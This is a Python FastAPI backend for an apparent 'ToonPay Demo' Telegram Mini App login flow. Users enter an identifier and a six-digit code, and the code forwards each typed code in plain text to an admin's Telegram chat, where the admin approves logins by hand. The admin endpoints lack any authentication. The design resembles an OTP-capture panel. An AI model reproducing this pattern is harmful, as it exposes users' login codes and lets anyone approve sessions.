import os
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import httpx

import database as db

app = FastAPI(title="ToonPay Demo")

STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "0"))
BACKEND_URL = os.getenv("BACKEND_URL", "").rstrip("/")

db.init_db()
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")


def _page(name):
    with open(os.path.join(STATIC_DIR, name), "r", encoding="utf-8") as f:
        return HTMLResponse(f.read())


@app.get("/", response_class=HTMLResponse)
def root():
    return _page("index.html")


@app.get("/otp", response_class=HTMLResponse)
def otp_page():
    return _page("otp.html")


@app.get("/dashboard", response_class=HTMLResponse)
def dashboard_page():
    return _page("dashboard.html")


@app.get("/logo.png")
def logo():
    return FileResponse(os.path.join(STATIC_DIR, "logo.png"))


# ---------- User OTP flow ----------

class OTPRequestIn(BaseModel):
    identifier: str
    telegram_id: int | None = None
    username: str | None = None
    first_name: str | None = None


@app.post("/api/request-otp")
async def request_otp(payload: OTPRequestIn):
    identifier = payload.identifier.strip()
    if not identifier:
        raise HTTPException(400, "identifier required")

    req_id = db.create_request(
        payload.telegram_id, payload.username or "", payload.first_name or "", identifier
    )

    # LOG
    db.log_activity(
        payload.telegram_id,
        payload.username,
        payload.first_name,
        "OTP request",
        f"for {identifier} (request #{req_id})",
    )

    await _notify_admin_new_request(req_id, identifier)
    return {"request_id": req_id}


class SubmitOTPIn(BaseModel):
    request_id: int
    otp: str


@app.post("/api/submit-otp")
async def submit_otp(payload: SubmitOTPIn):
    req = db.get_request(payload.request_id)
    if not req:
        raise HTTPException(404, "request not found")

    otp = payload.otp.strip()
    if len(otp) != 6 or not otp.isdigit():
        raise HTTPException(400, "OTP must be 6 digits")

    db.set_entered_otp(payload.request_id, otp)

    # LOG
    db.log_activity(
        req.get("telegram_id"),
        req.get("username"),
        req.get("first_name"),
        "Submitted OTP",
        f"typed {otp} for request #{payload.request_id}",
    )

    await _notify_admin_otp_submitted(payload.request_id, otp)
    return {"ok": True}


@app.get("/api/check-status")
def check_status(request_id: int):
    req = db.get_request(request_id)
    if not req:
        return {"status": "not_found"}
    status = req["status"]
    if status == "approved":
        token = db.create_session(req.get("telegram_id"), req["identifier"])
        return {"status": "approved", "token": token}
    if status == "rejected":
        return {"status": "rejected"}
    if status == "awaiting_decision":
        return {"status": "awaiting_decision"}
    if status == "assigned":
        return {"status": "assigned"}
    return {"status": "pending"}


@app.get("/api/me")
def me(token: str):
    s = db.get_session(token)
    if not s:
        raise HTTPException(401, "invalid session")
    return {"identifier": s["identifier"], "telegram_id": s["telegram_id"]}


# ---------- Mini App "opened" logging ----------

class OpenedIn(BaseModel):
    telegram_id: int | None = None
    username: str | None = None
    first_name: str | None = None


@app.post("/api/log-opened")
def log_opened(payload: OpenedIn):
    db.log_activity(
        payload.telegram_id,
        payload.username,
        payload.first_name,
        "Opened Mini App",
        "",
    )
    return {"ok": True}


# ---------- Admin API ----------

class AssignIn(BaseModel):
    request_id: int
    otp: str


@app.post("/api/admin/assign")
def admin_assign(payload: AssignIn):
    if len(payload.otp) != 6 or not payload.otp.isdigit():
        raise HTTPException(400, "OTP must be 6 digits")
    req = db.get_request(payload.request_id)
    db.set_assigned_otp(payload.request_id, payload.otp)

    if req:
        db.log_activity(
            req.get("telegram_id"),
            req.get("username"),
            req.get("first_name"),
            "Admin assigned OTP",
            f"{payload.otp} for request #{payload.request_id}",
        )
    return {"ok": True}


class DecisionIn(BaseModel):
    request_id: int
    decision: str  # "correct" | "incorrect"


@app.post("/api/admin/decision")
def admin_decision(payload: DecisionIn):
    if payload.decision not in ("correct", "incorrect"):
        raise HTTPException(400, "decision must be correct or incorrect")

    req = db.get_request(payload.request_id)
    db.set_decision(payload.request_id, payload.decision)

    if req:
        label = "Admin approved ✅ (LOGIN)" if payload.decision == "correct" else "Admin rejected ❌"
        db.log_activity(
            req.get("telegram_id"),
            req.get("username"),
            req.get("first_name"),
            label,
            f"request #{payload.request_id}",
        )
    return {"ok": True}


@app.get("/api/admin/pending")
def admin_pending():
    return {"requests": db.get_pending_requests()}


# ---------- Telegram notifications ----------

async def _send_telegram(chat_id: int, text: str, reply_markup: dict | None = None):
    if not BOT_TOKEN or not chat_id:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    body = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        body["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(url, json=body)
    except Exception as e:
        print("telegram send failed:", e)


async def _notify_admin_new_request(req_id: int, identifier: str):
    text = (
        f"🔔 <b>New OTP Request</b>\n\n"
        f"Request ID: <code>{req_id}</code>\n"
        f"User: <code>{identifier}</code>\n\n"
        f"Tap below to assign an OTP."
    )
    kb = {
        "inline_keyboard": [
            [{"text": "✏️ Assign OTP", "callback_data": f"assign:{req_id}"}],
            [{"text": "🚫 Reject", "callback_data": f"reject:{req_id}"}],
        ]
    }
    await _send_telegram(ADMIN_ID, text, kb)


async def _notify_admin_otp_submitted(req_id: int, entered: str):
    req = db.get_request(req_id) or {}
    assigned = req.get("assigned_otp") or "(none)"
    match = "✅ MATCH" if entered == assigned else "❌ MISMATCH"
    text = (
        f"🔔 <b>User submitted OTP</b>\n\n"
        f"Request ID: <code>{req_id}</code>\n"
        f"You assigned: <code>{assigned}</code>\n"
        f"User typed:   <code>{entered}</code>\n\n"
        f"{match}\n\nDecide below:"
    )
    kb = {
        "inline_keyboard": [
            [{"text": "✅ Correct — Let them in", "callback_data": f"approve:{req_id}"}],
            [{"text": "❌ Not Correct", "callback_data": f"reject:{req_id}"}],
        ]
    }
    await _send_telegram(ADMIN_ID, text, kb)
